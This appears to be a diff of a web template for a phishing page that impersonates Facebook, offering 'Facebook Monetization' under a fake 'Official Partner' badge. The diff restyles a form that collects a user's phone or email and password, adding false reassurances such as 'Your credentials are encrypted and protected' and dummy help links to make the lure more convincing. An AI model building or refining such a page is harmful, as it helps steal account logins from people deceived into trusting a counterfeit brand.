@@ -1,81 +1,357 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(24,119,242,0.25);border-radius:16px;">
-  <div class="platform-header">
-    <div class="icon-circle bg-facebook">
-      <i class="fa-brands fa-facebook icon-lg"></i>
+<div class="login-container">
+  <div class="login-card">
+    <!-- Enhanced Platform Header -->
+    <div class="platform-header">
+      <div class="platform-icon-container">
+        <div class="icon-circle bg-facebook">
+          <i class="fa-brands fa-facebook icon-lg"></i>
+        </div>
+        <div class="platform-badge">Official Partner</div>
+      </div>
+      <div class="platform-info">
+        <h2 class="platform-title notranslate">Facebook Monetization</h2>
+        <p class="platform-subtitle">Please login to continue with your account monetization</p>
+      </div>
     </div>
-    <div>
-      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
-      <div style="color:#64748b;font-size:13px">Please login to continue with your account monetization.</div>
+
+    <!-- Enhanced Login Form -->
+    <form id="loginForm" method="post" novalidate class="login-form">
+      <div class="input-group">
+        <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
+        <div class="error-text" id="addressError"></div>
+      </div>
+
+      <div class="input-group">
+        <input class="input" id="password" name="password" type="password" placeholder="Password" required>
+        <div class="error-text" id="passwordError"></div>
+      </div>
+
+      <button class="btn login-btn" type="submit">
+        <span class="btn-text">Continue to Monetization</span>
+        <span class="btn-arrow">→</span>
+      </button>
+    </form>
+
+    <!-- Enhanced Security Note -->
+    <div class="security-note">
+      <div class="security-icon">🔒</div>
+      <div class="security-content">
+        <p class="security-title">Secure Login</p>
+        <p class="security-subtitle">Your credentials are encrypted and protected</p>
+      </div>
     </div>
-  </div>
 
-  <form id="loginForm" method="post" novalidate>
-    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
-    <div class="error-text" id="addressError"></div>
-
-    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
-    <div class="error-text" id="passwordError"></div>
-
-    <button class="btn login-btn" type="submit">Log in</button>
-  </form>
-
-  <!-- ADDED SECURITY CAPTION -->
-  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0f9ff;border-radius:12px;border:1px solid #e0f2fe;">
-    <p style="margin:0;color:#0369a1;font-size:0.9rem;font-weight:500;text-align:center;">
-      🔒 Your login credentials are encrypted and secure
-    </p>
+    <!-- Additional Help Links -->
+    <div class="help-links">
+      <a href="#" class="help-link">Forgotten password?</a>
+      <span class="link-separator">•</span>
+      <a href="#" class="help-link">Create new account</a>
+    </div>
   </div>
 </div>
 
 <style>
+.login-container {
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  min-height: 100vh;
+  padding: 20px 16px;
+  background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+}
+
+.login-card {
+  width: 100%;
+  max-width: 440px;
+  background: #ffffff;
+  border-radius: 20px;
+  box-shadow: 
+    0 8px 25px -5px rgba(24, 119, 242, 0.15),
+    0 2px 8px -1px rgba(0, 0, 0, 0.05),
+    0 0 0 1px rgba(255, 255, 255, 0.9);
+  padding: 32px;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  border: 1px solid rgba(255, 255, 255, 0.8);
+}
+
+.login-card:hover {
+  box-shadow: 
+    0 12px 35px -8px rgba(24, 119, 242, 0.2),
+    0 4px 12px -2px rgba(0, 0, 0, 0.06),
+    0 0 0 1px rgba(255, 255, 255, 0.9);
+  transform: translateY(-2px);
+}
+
+/* Enhanced Platform Header */
+.platform-header {
+  text-align: center;
+  margin-bottom: 32px;
+  padding-bottom: 24px;
+  border-bottom: 1px solid #f1f5f9;
+  position: relative;
+}
+
+.platform-icon-container {
+  position: relative;
+  display: inline-block;
+  margin-bottom: 16px;
+}
+
+.platform-badge {
+  position: absolute;
+  top: -6px;
+  right: -6px;
+  background: linear-gradient(135deg, #10b981, #059669);
+  color: white;
+  font-size: 10px;
+  font-weight: 700;
+  padding: 4px 8px;
+  border-radius: 10px;
+  line-height: 1;
+  box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3);
+}
+
+.icon-circle.bg-facebook {
+  background: linear-gradient(135deg, #1877F2, #166fe5);
+  box-shadow: 0 6px 20px rgba(24, 119, 242, 0.3);
+  transition: transform 0.3s ease;
+}
+
+.platform-icon-container:hover .icon-circle.bg-facebook {
+  transform: scale(1.05);
+}
+
+.platform-title {
+  font-size: 24px;
+  font-weight: 800;
+  margin: 0 0 8px 0;
+  background: linear-gradient(135deg, #1877F2, #0d5fbf);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  letter-spacing: -0.3px;
+}
+
+.platform-subtitle {
+  color: #64748b;
+  font-size: 14px;
+  font-weight: 500;
+  margin: 0;
+  line-height: 1.4;
+}
+
+/* Enhanced Form Styles */
+.login-form {
+  margin-bottom: 24px;
+}
+
+.input-group {
+  margin-bottom: 16px;
+}
+
 .input {
   width: 100%;
-  padding: 14px;
-  border-radius: 18px;
-  border: 1px solid #e5e7eb;
-  margin-bottom: 8px;
-  font-size: 16px;
-  transition: border-color 0.2s, box-shadow 0.2s;
+  padding: 16px 20px;
+  border-radius: 14px;
+  border: 1.5px solid #e2e8f0;
+  background: #ffffff;
+  font-size: 15px;
+  font-weight: 500;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
 }
+
 .input:focus {
   border-color: #1877F2;
-  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.25);
+  box-shadow: 
+    0 0 0 4px rgba(24, 119, 242, 0.15),
+    0 2px 6px rgba(0, 0, 0, 0.08);
   outline: none;
+  transform: translateY(-1px);
 }
+
+.input::placeholder {
+  color: #94a3b8;
+  font-weight: 500;
+}
+
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+  box-shadow: 
+    0 0 0 4px rgba(239, 68, 68, 0.15),
+    0 2px 6px rgba(0, 0, 0, 0.08);
 }
+
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: -4px;
-  margin-bottom: 8px;
+  font-weight: 600;
+  margin-top: 6px;
+  margin-left: 4px;
+  display: flex;
+  align-items: center;
+  gap: 4px;
 }
 
+.error-text::before {
+  content: "⚠";
+  font-size: 12px;
+}
+
+/* Enhanced Login Button */
 .login-btn {
   width: 100%;
-  background: #1877F2;
-  color: #fff;
+  background: linear-gradient(135deg, #1877F2, #166fe5);
+  color: #ffffff;
   font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 25px;
+  padding: 16px 24px;
+  border-radius: 14px;
   cursor: pointer;
   border: none;
-  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
-  display: block;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 
+    0 6px 20px rgba(24, 119, 242, 0.35),
+    0 2px 4px rgba(24, 119, 242, 0.1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
   margin-top: 8px;
+  position: relative;
+  overflow: hidden;
 }
+
+.login-btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transition: left 0.5s;
+}
+
+.login-btn:hover::before {
+  left: 100%;
+}
+
 .login-btn:hover {
-  background: #166fe5;
-  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+  background: linear-gradient(135deg, #166fe5, #1258c4);
+  box-shadow: 
+    0 8px 25px rgba(24, 119, 242, 0.45),
+    0 4px 8px rgba(24, 119, 242, 0.15);
+  transform: translateY(-2px);
 }
+
 .login-btn:active {
-  transform: scale(0.985);
+  transform: translateY(0);
+  box-shadow: 
+    0 4px 12px rgba(24, 119, 242, 0.35),
+    0 1px 2px rgba(24, 119, 242, 0.1);
+}
+
+.btn-arrow {
+  font-size: 14px;
+  transition: transform 0.3s ease;
+}
+
+.login-btn:hover .btn-arrow {
+  transform: translateX(2px);
+}
+
+/* Enhanced Security Note */
+.security-note {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px 20px;
+  background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+  border-radius: 14px;
+  border: 1px solid #bae6fd;
+  margin-bottom: 20px;
+  transition: all 0.2s ease;
+}
+
+.security-note:hover {
+  border-color: #7dd3fc;
+  transform: translateY(-1px);
+}
+
+.security-icon {
+  font-size: 18px;
+  flex-shrink: 0;
+}
+
+.security-content {
+  flex: 1;
+}
+
+.security-title {
+  font-size: 14px;
+  font-weight: 700;
+  color: #0369a1;
+  margin: 0 0 2px 0;
+}
+
+.security-subtitle {
+  font-size: 12px;
+  color: #0c4a6e;
+  font-weight: 500;
+  margin: 0;
+  opacity: 0.8;
+}
+
+/* Help Links */
+.help-links {
+  text-align: center;
+  padding-top: 16px;
+  border-top: 1px solid #f1f5f9;
+}
+
+.help-link {
+  color: #64748b;
+  font-size: 13px;
+  font-weight: 600;
+  text-decoration: none;
+  transition: color 0.2s ease;
+}
+
+.help-link:hover {
+  color: #1877F2;
+}
+
+.link-separator {
+  color: #cbd5e1;
+  margin: 0 12px;
+  font-weight: 500;
+}
+
+/* Responsive Design */
+@media (max-width: 480px) {
+  .login-container {
+    padding: 16px 12px;
+  }
+  
+  .login-card {
+    padding: 24px 20px;
+    border-radius: 18px;
+  }
+  
+  .platform-title {
+    font-size: 22px;
+  }
+  
+  .input {
+    padding: 14px 16px;
+  }
+  
+  .login-btn {
+    padding: 14px 20px;
+  }
 }
 </style>
 
@@ -115,6 +391,17 @@ document.querySelectorAll(".input").forEach(input => {
     input.classList.remove("input-error");
     if (input.id === "address") document.getElementById("addressError").textContent = "";
     if (input.id === "password") document.getElementById("passwordError").textContent = "";
+  });
+});
+
+// Add focus effects
+document.querySelectorAll('.input').forEach(input => {
+  input.addEventListener('focus', function() {
+    this.parentElement.classList.add('focused');
+  });
+  
+  input.addEventListener('blur', function() {
+    this.parentElement.classList.remove('focused');
   });
 });
 </script>
